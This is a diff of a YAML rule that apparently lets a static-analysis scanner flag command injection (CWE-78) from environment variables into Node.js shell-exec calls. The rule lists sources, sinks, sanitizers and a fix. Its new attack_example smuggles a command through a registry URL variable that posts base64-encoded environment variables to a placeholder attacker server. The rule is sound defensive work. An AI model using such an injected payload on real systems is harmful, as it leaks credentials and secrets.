@@ -6,53 +6,47 @@ description: >
   arbitrary command chaining.
 cwe: CWE-78
 severity: Critical
-cvss_base: 8.4
-reference_cves:
-  - CVE-2026-35020
+cvss_base: 8.2
 
 source:
   type: ENV_VAR
   patterns:
-    - process.env.TERMINAL
+    - process.env.DG_REGISTRY
     - process.env.EDITOR
     - process.env.SHELL
     - process.env.PAGER
-    - process.env.*                   # any env var that reaches a shell sink
+    - process.env.*
 
 transforms:
-  - type: template_literal            # `which ${input}`
-  - type: string_concat               # 'which ' + input
-  - type: passthrough                 # direct assignment
+  - type: template_literal
+  - type: string_concat
+  - type: passthrough
 
 sanitizers:
   - shellEscape(input)
-  - shellescape([input])
-  - input.replace(/[^a-zA-Z0-9_\-\.\/]/g, '')   # strict allowlist only
+  - new URL(input)
+  - input.replace(/[^a-zA-Z0-9_\-\.\/\:]/g, '')
 
 sink:
   type: SHELL_EXEC
   patterns:
-    - execa(*, { shell: true })
     - execSync(string_with_variable)
-    - exec(string_with_variable)
+    - exec(string_with_variable, callback)
+    - execa(*, { shell: true })
     - spawn('sh', ['-c', *])
     - spawn('bash', ['-c', *])
 
-chain_required: false                 # single-hop is still flagged
+chain_required: false
 session_crossing: false
 
 attack_example: |
-  # Attacker sets in .env or CI variable:
-  TERMINAL='touch /tmp/pwned; echo sk-ant-fake'
-
-  # Code does:
-  execa(`which ${process.env.TERMINAL}`, { shell: true })
-  # Executes: which touch /tmp/pwned; echo sk-ant-fake
-  # → touch /tmp/pwned runs
+  DG_REGISTRY='https://registry.npmjs.org"; curl -sX POST https://c2.attacker.io -d "$(env | base64)"; echo "'
+  execSync(`curl -s "${process.env.DG_REGISTRY}/${packageName}/latest"`)
 
 fix:
-  description: Pass command arguments as an array, never as a shell string
+  description: Pass arguments as array, never as a shell string
   before: |
-    execa(`which ${process.env.TERMINAL}`, { shell: true })
+    execSync(`curl -s "${registry}/${packageName}/latest"`)
   after: |
-    execa('which', [process.env.TERMINAL])   // no shell expansion, arg is literal
+    const url = new URL(`/${packageName}/latest`, registry)
+    execa('curl', ['-s', url.toString()])
